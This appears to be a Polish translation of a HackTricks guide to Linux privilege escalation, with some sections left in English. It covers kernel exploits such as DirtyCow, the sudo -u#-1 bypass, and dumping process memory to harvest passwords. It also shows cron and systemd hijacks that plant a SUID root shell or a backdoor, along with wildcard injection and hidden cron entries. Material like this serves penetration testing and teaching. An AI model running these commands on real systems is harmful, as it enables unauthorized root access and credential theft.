# Eskalacja uprawnień w systemie Linux

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Informacje o systemie

### Informacje o systemie operacyjnym

Zacznijmy zdobywać wiedzę na temat działającego systemu operacyjnego.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Ścieżka

Jeśli **masz uprawnienia do zapisu w dowolnym folderze znajdującym się w zmiennej `PATH`**, możesz próbować przejąć kontrolę nad niektórymi bibliotekami lub plikami binarnymi:
```bash
echo $PATH
```
### Informacje o środowisku

Czy istnieją interesujące informacje, hasła lub klucze API w zmiennych środowiskowych?
```bash
(env || set) 2>/dev/null
```
### Exploity jądra

Sprawdź wersję jądra i czy istnieje jakiś exploit, który może być wykorzystany do eskalacji uprawnień.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Możesz znaleźć dobrą listę podatnych jąder i już **skompilowane exploit'y** tutaj: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) oraz [exploitdb sploits](https://github.com/offensive-security/exploitdb-bin-sploits/tree/master/bin-sploits).\
Inne strony, na których można znaleźć **skompilowane exploit'y**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Aby wyodrębnić wszystkie podatne wersje jądra z tej strony, możesz użyć poniższego polecenia:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Narzędzia, które mogą pomóc w wyszukiwaniu exploitów jądra to:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (wykonaj NA ofierze, sprawdza tylko exploity dla jądra 2.x)

Zawsze **wyszukaj wersję jądra w Google**, być może Twoja wersja jądra jest wymieniona w jakimś exploicie jądra, a następnie będziesz pewien, że ten exploit jest ważny.

### CVE-2016-5195 (DirtyCow)

Podwyższenie uprawnień w systemie Linux - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Wersja Sudo

Na podstawie podatnych wersji sudo, które występują w:
```bash
searchsploit sudo
```
Możesz sprawdzić, czy wersja sudo jest podatna, używając tego polecenia grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
#### sudo < v1.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Weryfikacja podpisu Dmesg nie powiodła się

Sprawdź **smasher2 box of HTB** dla **przykładu**, jak ta luka może być wykorzystana.
```bash
dmesg 2>/dev/null | grep "signature"
```
### Więcej wyliczania systemu

Once you have gained initial access to a system, it is important to perform thorough enumeration to gather as much information as possible. This will help you identify potential vulnerabilities and escalate privileges.

#### User Enumeration

Start by enumerating the users on the system. This can be done by checking the `/etc/passwd` file, which contains information about all the users on the system. You can use the following command to view the contents of this file:

```bash
cat /etc/passwd
```

Look for any users that have a shell assigned to them (usually `/bin/bash` or `/bin/sh`). These users are likely to have interactive access to the system and may have higher privileges.

#### Group Enumeration

Next, enumerate the groups on the system. The `/etc/group` file contains information about all the groups on the system. Use the following command to view the contents of this file:

```bash
cat /etc/group
```

Look for any groups that have users assigned to them. These groups may have specific permissions and privileges that can be exploited.

#### Service Enumeration

Enumerate the running services on the system. This can be done using tools like `netstat` or `ss`. For example, you can use the following command to list all the listening TCP and UDP ports:

```bash
netstat -tuln
```

Look for any services that are running with elevated privileges or are vulnerable to known exploits.

#### File and Directory Enumeration

Enumerate the files and directories on the system. This can be done using commands like `ls` or `find`. For example, you can use the following command to list all the files and directories in the current directory:

```bash
ls -la
```

Look for any files or directories that have improper permissions or contain sensitive information.

#### Network Enumeration

Enumerate the network configuration of the system. This can be done using commands like `ifconfig` or `ip`. For example, you can use the following command to view the network interfaces and their configurations:

```bash
ifconfig -a
```

Look for any network interfaces that are connected to privileged networks or have misconfigured settings.

#### Process Enumeration

Enumerate the running processes on the system. This can be done using commands like `ps` or `top`. For example, you can use the following command to list all the running processes:

```bash
ps aux
```

Look for any processes that are running with elevated privileges or are vulnerable to known exploits.

#### System Enumeration

Finally, gather general system information. This can be done using commands like `uname` or `lsb_release`. For example, you can use the following command to display the system's kernel version:

```bash
uname -a
```

Look for any system information that can be used to identify vulnerabilities or potential attack vectors.

By thoroughly enumerating the system, you can gather valuable information that will help you in the privilege escalation process.
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
### Wylicz możliwe obrony

### AppArmor

AppArmor to mechanizm kontroli dostępu w jądrze systemu Linux, który pozwala na ograniczenie uprawnień procesów. Działa na zasadzie profilowania aplikacji, co umożliwia kontrolę nad tym, jakie zasoby i operacje mogą być wykonywane przez dany proces. AppArmor może być używany do zabezpieczania systemu przed atakami typu privilege escalation, ograniczając możliwość wykorzystania podwyższonych uprawnień przez potencjalnego atakującego.
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity

Grsecurity jest zestawem łatek jądra Linuxa, które mają na celu zwiększenie bezpieczeństwa systemu operacyjnego poprzez wprowadzenie dodatkowych funkcji ochronnych. Grsecurity wprowadza mechanizmy kontroli dostępu, które ograniczają uprawnienia użytkowników i procesów, co utrudnia potencjalnym atakującym eskalację uprawnień.

Grsecurity oferuje również funkcje takie jak ochrona przed przepełnieniem bufora, wykrywanie i blokowanie ataków typu "return-to-libc" oraz ochrona przed atakami polegającymi na nadpisywaniu wskaźników funkcji. Dodatkowo, Grsecurity wprowadza mechanizmy monitorowania i audytu, które umożliwiają wykrywanie i reagowanie na podejrzane działania w systemie.

W celu zwiększenia bezpieczeństwa systemu, Grsecurity wprowadza również funkcje takie jak ochrona pamięci, ograniczenia dla procesów, kontroli dostępu do plików i sieci oraz zabezpieczenia przed atakami typu "symlink".

Grsecurity jest popularnym narzędziem w środowiskach, gdzie bezpieczeństwo jest priorytetem, takich jak serwery, systemy wbudowane i urządzenia IoT.
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
PaX to zestaw zabezpieczeń dla jądra Linux, który ma na celu utrudnienie ataków na podwyższenie uprawnień. PaX wprowadza różne mechanizmy, takie jak ASLR (Address Space Layout Randomization) i W^X (Write XOR Execute), które mają zapobiegać wykorzystaniu podatności w celu uzyskania większych uprawnień. ASLR losowo rozmieszcza przestrzeń adresową procesów, utrudniając przewidywanie lokalizacji kodu i danych w pamięci. W^X natomiast uniemożliwia wykonanie kodu z obszarów pamięci oznaczonych jako tylko do odczytu. Dzięki tym mechanizmom PaX utrudnia atakującym wykorzystanie podatności w celu uzyskania uprawnień roota.
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield

Execshield jest mechanizmem ochrony stosowanym w systemach Linux, który ma na celu zapobieganie atakom polegającym na wykorzystaniu błędów w pamięci. Chroni on przed atakami typu bufor przepełnienia, w których złośliwy kod próbuje nadpisać obszar pamięci i wykonać własny kod. Execshield osiąga to poprzez zastosowanie technik takich jak randomizacja adresów pamięci (ASLR) i ochrona przed wykonaniem kodu na stosie (Stack Executable Protection). Dzięki temu utrudnia atakującym wykorzystanie podatności w aplikacjach i zwiększa ogólną bezpieczeństwo systemu.
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux

SElinux (Security-Enhanced Linux) to mechanizm kontroli dostępu w jądrze systemu Linux. Został opracowany przez NSA (National Security Agency) i jest wbudowany w wiele dystrybucji Linuxa, takich jak Red Hat, CentOS i Fedora. SElinux wprowadza dodatkową warstwę ochrony, która ogranicza uprawnienia procesów i zasobów systemowych.

Głównym celem SElinux jest zapewnienie większego bezpieczeństwa systemu poprzez kontrolę dostępu na poziomie jądra. Działa na zasadzie polityki bezpieczeństwa, która definiuje, jakie działania są dozwolone dla poszczególnych procesów i zasobów. SElinux może blokować dostęp do nieautoryzowanych zasobów, a także uniemożliwiać wykonanie niebezpiecznych operacji przez procesy.

SElinux wprowadza trzy tryby działania: enforcing, permissive i disabled. Tryb enforcing jest najbardziej restrykcyjny i blokuje dostęp do nieautoryzowanych zasobów. Tryb permissive pozwala na dostęp, ale generuje ostrzeżenia w dzienniku systemowym. Tryb disabled całkowicie wyłącza SElinux.

Aby skonfigurować SElinux, można użyć narzędzi takich jak `semanage`, `setsebool` i `sestatus`. Narzędzia te umożliwiają zarządzanie polityką bezpieczeństwa, włączanie i wyłączanie trybów działania oraz dostosowywanie reguł dostępu.

SElinux jest ważnym narzędziem w zabezpieczaniu systemów Linux przed atakami i nadużyciami. Poprawna konfiguracja SElinux może znacznie zwiększyć bezpieczeństwo systemu, ograniczając możliwość eskalacji uprawnień i nieautoryzowanego dostępu.
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
ASLR (Address Space Layout Randomization) to mechanizm ochrony stosowany w systemach operacyjnych, który utrudnia atakującym przewidywanie adresów pamięci. Działa poprzez losowe umieszczanie w pamięci obszarów kodu, danych i stosu, co utrudnia wykorzystanie podatności w celu eskalacji uprawnień. ASLR jest skuteczną techniką obronną, która zmniejsza ryzyko ataków na systemy operacyjne.
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Ucieczka z Docker

Jeśli jesteś wewnątrz kontenera Docker, możesz spróbować z niego uciec:

{% content-ref url="docker-security/" %}
[docker-security](docker-security/)
{% endcontent-ref %}

## Dyski

Sprawdź, **co jest zamontowane i odmontowane**, gdzie i dlaczego. Jeśli coś jest odmontowane, możesz spróbować je zamontować i sprawdzić prywatne informacje.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Przydatne oprogramowanie

Wylicz przydatne pliki binarne
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Sprawdź również, czy **zainstalowany jest jakikolwiek kompilator**. Jest to przydatne, jeśli potrzebujesz użyć jakiegoś exploitu jądra, ponieważ zaleca się go kompilować na maszynie, na której zamierzasz go użyć (lub na podobnej).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Zainstalowane oprogramowanie podatne na ataki

Sprawdź **wersję zainstalowanych pakietów i usług**. Być może istnieje starsza wersja Nagiosa (na przykład), która może być wykorzystana do eskalacji uprawnień...\
Zaleca się ręczne sprawdzenie wersji najbardziej podejrzanego zainstalowanego oprogramowania.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Jeśli masz dostęp SSH do maszyny, możesz również użyć **openVAS** do sprawdzenia, czy wewnątrz maszyny zainstalowane są przestarzałe i podatne na ataki oprogramowanie.

{% hint style="info" %}
Zauważ, że te polecenia pokażą wiele informacji, które będą w większości bezużyteczne, dlatego zaleca się użycie aplikacji takich jak OpenVAS lub podobnych, które sprawdzą, czy zainstalowana wersja oprogramowania jest podatna na znane ataki.
{% endhint %}

## Procesy

Sprawdź **jakie procesy** są uruchomione i sprawdź, czy którykolwiek proces ma **więcej uprawnień, niż powinien** (może to być na przykład tomcat uruchomiony przez roota?).
```bash
ps aux
ps -ef
top -n 1
```
Zawsze sprawdzaj, czy działają [**debuggery electron/cef/chromium**], można je wykorzystać do eskalacji uprawnień](electron-cef-chromium-debugger-abuse.md). **Linpeas** wykrywa je, sprawdzając parametr `--inspect` w wierszu poleceń procesu.\
Sprawdź również [**swoje uprawnienia do binarnych procesów**], być może możesz je nadpisać.

### Monitorowanie procesów

Możesz użyć narzędzi takich jak [**pspy**](https://github.com/DominicBreuker/pspy), aby monitorować procesy. Jest to bardzo przydatne do identyfikacji podatnych procesów, które są uruchamiane często lub gdy spełnione są określone wymagania.

### Pamięć procesu

Niektóre usługi serwera zapisują [**poświadczenia w postaci tekstu jawnego w pamięci**].\
Zazwyczaj będziesz potrzebować [**uprawnień roota**], aby odczytać pamięć procesów należących do innych użytkowników, dlatego jest to zwykle bardziej przydatne, gdy już jesteś rootem i chcesz odkryć więcej poświadczeń.\
Jednak pamiętaj, że [**jako zwykły użytkownik możesz odczytać pamięć procesów, które posiadasz**].

{% hint style="warning" %}
Zauważ, że obecnie większość maszyn [**nie zezwala domyślnie na ptrace**], co oznacza, że nie możesz zrzucić pamięci innych procesów należących do twojego nieuprzywilejowanego użytkownika.

Plik _**/proc/sys/kernel/yama/ptrace\_scope**_ kontroluje dostępność ptrace:

* **kernel.yama.ptrace\_scope = 0**: wszystkie procesy mogą być debugowane, o ile mają ten sam uid. To jest klasyczny sposób działania ptrace.
* **kernel.yama.ptrace\_scope = 1**: tylko proces nadrzędny może być debugowany.
* **kernel.yama.ptrace\_scope = 2**: Tylko administrator może używać ptrace, ponieważ wymaga to uprawnienia CAP\_SYS\_PTRACE.
* **kernel.yama.ptrace\_scope = 3**: Nie można śledzić żadnych procesów za pomocą ptrace. Po ustawieniu wymagany jest restart, aby ponownie włączyć śledzenie ptrace.
{% endhint %}

#### GDB

Jeśli masz dostęp do pamięci usługi FTP (na przykład), możesz uzyskać stertę i przeszukać jej poświadczenia.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### Skrypt GDB

{% code title="dump-memory.sh" %}
```bash
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
{% endcode %}

#### /proc/$pid/maps & /proc/$pid/mem

Dla określonego identyfikatora procesu, **maps pokazuje, jak pamięć jest mapowana w przestrzeni adresowej tego procesu**; pokazuje również **uprawnienia każdego zmapowanego obszaru**. Pseudo plik **mem ujawnia samą pamięć procesu**. Na podstawie pliku **maps wiemy, które regiony pamięci są odczytywalne** i ich przesunięcia. Wykorzystujemy te informacje, aby **przeszukać plik mem i zrzucić wszystkie odczytywalne regiony** do pliku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` udostępnia dostęp do **fizycznej** pamięci systemu, a nie do pamięci wirtualnej. Przestrzeń adresowa wirtualna jądra można uzyskać za pomocą /dev/kmem.\
Zazwyczaj, `/dev/mem` jest tylko do odczytu przez użytkownika **root** i grupę **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump dla systemu Linux

ProcDump to linuxowa wersja klasycznego narzędzia ProcDump z pakietu narzędzi Sysinternals dla systemu Windows. Możesz go pobrać z [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Narzędzia

Aby wydobyć pamięć procesu, możesz użyć:

* [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
* [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Możesz ręcznie usunąć wymaganie uprawnień roota i wydobyć proces należący do Ciebie
* Skrypt A.5 z [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (wymagane są uprawnienia roota)

### Poświadczenia z pamięci procesu

#### Przykład ręczny

Jeśli zauważysz, że proces uwierzytelniania jest uruchomiony:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Możesz wydobyć proces (zobacz poprzednie sekcje, aby znaleźć różne sposoby na wydobycie pamięci procesu) i wyszukać poświadczenia wewnątrz pamięci:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Narzędzie [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **kradnie hasła w postaci zwykłego tekstu z pamięci** oraz z niektórych **znanych plików**. Do poprawnego działania wymaga uprawnień roota.

| Funkcja                                           | Nazwa procesu        |
| ------------------------------------------------- | -------------------- |
| Hasło GDM (Kali Desktop, Debian Desktop)          | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (Aktywne połączenia FTP)                   | vsftpd               |
| Apache2 (Aktywne sesje HTTP Basic Auth)           | apache2              |
| OpenSSH (Aktywne sesje SSH - Użycie Sudo)         | sshd:                |

#### Wyszukiwanie Regexów/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zaplanowane/Zadania Cron

Sprawdź, czy istnieje jakiekolwiek zadanie zaplanowane, które jest podatne na atak. Być może możesz wykorzystać skrypt wykonywany przez użytkownika root (czy jest podatny na wildcard? czy można modyfikować pliki używane przez root? czy można użyć symlinków? czy można utworzyć określone pliki w katalogu używanym przez root?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
### Ścieżka Cron

Na przykład, wewnątrz _/etc/crontab_ można znaleźć ścieżkę: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Zauważ, że użytkownik "user" ma uprawnienia do zapisu w /home/user_)

Jeśli wewnątrz tego crontab użytkownik root próbuje wykonać pewne polecenie lub skrypt bez ustawienia ścieżki. Na przykład: _\* \* \* \* root overwrite.sh_\
W takim przypadku, można uzyskać powłokę roota, używając:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron z użyciem skryptu z wildcardem (Wildcard Injection)

Jeśli skrypt jest wykonywany przez użytkownika root i zawiera „**\***” wewnątrz polecenia, można to wykorzystać do wykonania nieoczekiwanych czynności (np. podniesienia uprawnień). Przykład:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Jeśli znak wieloznaczny jest poprzedzony ścieżką, na przykład** _**/some/path/\***_, **to nie jest podatny na atak (nawet** _**./\*** **nie jest).**

Przeczytaj następującą stronę, aby poznać więcej trików związanych z wykorzystaniem znaków wieloznacznych:

{% content-ref url="wildcards-spare-tricks.md" %}
[wildcards-spare-tricks.md](wildcards-spare-tricks.md)
{% endcontent-ref %}

### Nadpisywanie skryptu Cron i symlink

Jeśli **możesz zmodyfikować skrypt Cron** uruchamiany przez użytkownika root, możesz bardzo łatwo uzyskać dostęp do powłoki:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Jeśli skrypt uruchomiony przez użytkownika root korzysta z **katalogu, w którym masz pełny dostęp**, może być przydatne usunięcie tego folderu i **utworzenie symlinku do innego folderu**, w którym znajduje się skrypt kontrolowany przez ciebie.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Częste zadania cron

Możesz monitorować procesy, aby znaleźć te, które są wykonywane co 1, 2 lub 5 minut. Być może możesz z tego skorzystać i podnieść uprawnienia.

Na przykład, aby **monitorować co 0,1 s przez 1 minutę**, **sortować według mniej wykonywanych poleceń** i usuwać najczęściej wykonywane polecenia, możesz wykonać:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Możesz również użyć** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (to narzędzie monitoruje i wyświetla każdy proces, który się uruchamia).

### Niewidoczne zadania cron

Możliwe jest utworzenie zadania cron **poprzez dodanie znaku powrotu karetki po komentarzu** (bez znaku nowej linii), a zadanie cron będzie działać. Przykład (zwróć uwagę na znak powrotu karetki):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
## Usługi

### Pliki _.service_ z możliwością zapisu

Sprawdź, czy możesz zapisać jakikolwiek plik `.service`. Jeśli tak, **możesz go zmodyfikować**, aby **wykonywał** twój **tylny drzwi**, gdy usługa zostanie **uruchomiona**, **ponownie uruchomiona** lub **zatrzymana** (może być konieczne oczekiwanie, aż maszyna zostanie ponownie uruchomiona).\
Na przykład, stwórz swoje tylny drzwi wewnątrz pliku .service za pomocą **`ExecStart=/tmp/script.sh`**

### Wykonywalne pliki usługowe z możliwością zapisu

Pamiętaj, że jeśli masz **uprawnienia do zapisu dla plików wykonywanych przez usługi**, możesz je zmienić na tylny drzwi, dzięki czemu po ponownym uruchomieniu usług będą one wykonywane.

### systemd PATH - Ścieżki względne

Możesz zobaczyć ścieżkę używaną przez **systemd** za pomocą:
```bash
systemctl show-environment
```
Jeśli odkryjesz, że możesz **zapisywać** w dowolnym z folderów ścieżki, możesz być w stanie **podnieść uprawnienia**. Musisz szukać plików konfiguracyjnych usług, w których używane są **ścieżki względne**, takie jak:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Następnie, utwórz **wykonywalny plik** o **takiej samej nazwie jak względna ścieżka binarna** w folderze PATH systemd, w którym możesz pisać. Gdy usługa zostanie poproszona o wykonanie podatnej akcji (**Start**, **Stop**, **Reload**), zostanie uruchomione twoje **tylne drzwi** (zwykle nieuprzywilejowani użytkownicy nie mogą uruchamiać/zatrzymywać usług, ale sprawdź, czy możesz użyć `sudo -l`).

**Dowiedz się więcej o usługach za pomocą `man systemd.service`.**

## **Timery**

**Timery** to pliki jednostek systemd, których nazwa kończy się na `**.timer**`, które kontrolują pliki lub zdarzenia `**.service**`. **Timery** mogą być używane jako alternatywa dla cron, ponieważ mają wbudowane wsparcie dla zdarzeń czasowych kalendarza i czasu monotonicznego oraz mogą być uruchamiane asynchronicznie.

Możesz wyliczyć wszystkie timery za pomocą:
```bash
systemctl list-timers --all
```
### Zapisywalne timery

Jeśli możesz modyfikować timer, możesz sprawić, że będzie on wykonywał istniejące jednostki systemd (takie jak `.service` lub `.target`).
```bash
Unit=backdoor.service
```
W dokumentacji możesz przeczytać, czym jest jednostka:

> Jednostka, która ma zostać aktywowana po upływie czasu timera. Argumentem jest nazwa jednostki, której sufiks nie jest ".timer". Jeśli nie jest określone, wartość ta domyślnie przyjmuje jednostkę o tej samej nazwie co jednostka timera, z wyjątkiem sufiksu. (Patrz powyżej.) Zaleca się, aby nazwa jednostki, która jest aktywowana, i nazwa jednostki timera były identyczne, z wyjątkiem sufiksu.

Aby wykorzystać to uprawnienie, musisz:

* Znaleźć jakąś jednostkę systemd (np. `.service`), która **wykonuje zapisywalny plik binarny**
* Znaleźć jakąś jednostkę systemd, która **wykonuje ścieżkę względną** i masz **uprawnienia do zapisu** w **ścieżce systemd** (aby podszyć się pod ten plik wykonywalny)

**Dowiedz się więcej o timerach za pomocą `man systemd.timer`.**

### **Włączanie timera**

Aby włączyć timer, potrzebujesz uprawnień roota i wykonaj:
```bash
sudo systemctl enable backu2.timer
Created symlink /etc/systemd/system/multi-user.target.wants/backu2.timer → /lib/systemd/system/backu2.timer.
```
Zauważ, że **timer** jest **aktywowany** poprzez utworzenie symlinku do niego w `/etc/systemd/system/<WantedBy_section>.wants/<name>.timer`

## Sockety

Unix Domain Sockets (UDS) umożliwiają **komunikację między procesami** w ramach modeli klient-serwer na tym samym lub różnych maszynach. Wykorzystują standardowe pliki deskryptorów Unix do komunikacji międzykomputerowej i są konfigurowane za pomocą plików `.socket`.

Sockety można skonfigurować za pomocą plików `.socket`.

**Dowiedz się więcej o socketach za pomocą `man systemd.socket`.** Wewnątrz tego pliku można skonfigurować kilka interesujących parametrów:

* `ListenStream`, `ListenDatagram`, `ListenSequentialPacket`, `ListenFIFO`, `ListenSpecial`, `ListenNetlink`, `ListenMessageQueue`, `ListenUSBFunction`: Opcje te różnią się, ale podsumowanie jest używane do **określenia, gdzie będzie nasłuchiwał** socket (ścieżka pliku AF\_UNIX socket, numer portu IPv4/6, itp.)
* `Accept`: Przyjmuje argument typu boolean. Jeśli **true**, dla każdego przychodzącego połączenia **tworzona jest instancja usługi**, a do niej przekazywany jest tylko gniazdo połączenia. Jeśli **false**, wszystkie nasłuchujące gniazda są **przekazywane do uruchomionej jednostki usługi**, a tylko jedna jednostka usługi jest tworzona dla wszystkich połączeń. Ta wartość jest ignorowana dla gniazd datagramowych i FIFO, gdzie jednostka usługi jednoznacznie obsługuje cały przychodzący ruch. **Domyślnie ustawione na false**. Ze względów wydajnościowych zaleca się pisanie nowych demonów w sposób odpowiedni dla `Accept=no`.
* `ExecStartPre`, `ExecStartPost`: Przyjmuje jedną lub więcej linii poleceń, które są **wykonywane przed** lub **po** utworzeniu i powiązaniu **gniazd**/FIFO do nasłuchiwania. Pierwszy token w linii polecenia musi być bezwzględną nazwą pliku, a następnie podane są argumenty dla procesu.
* `ExecStopPre`, `ExecStopPost`: Dodatkowe **polecenia**, które są **wykonywane przed** lub **po** zamknięciu i usunięciu **gniazd**/FIFO do nasłuchiwania.
